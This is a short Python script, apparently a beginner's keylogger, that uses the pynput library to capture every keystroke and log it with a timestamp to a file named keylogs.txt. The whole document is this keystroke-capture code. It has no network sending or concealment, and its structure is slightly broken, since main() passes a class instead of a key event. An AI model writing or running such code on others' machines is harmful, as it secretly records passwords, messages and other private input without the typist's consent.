from pynput.keyboard import Key, Listener

import logging as log

#log_dir = ""

log.basicConfig(filename=("keylogs.txt"), level=log.DEBUG, format='%(asctime)s : %(message)s')
try:
    # waiting for keystrokes to strike
    def on_press(Key):
        print("listening ...")
        log.info(str(Key))

    with Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    print(e)
    

def main():
    on_press(Key)

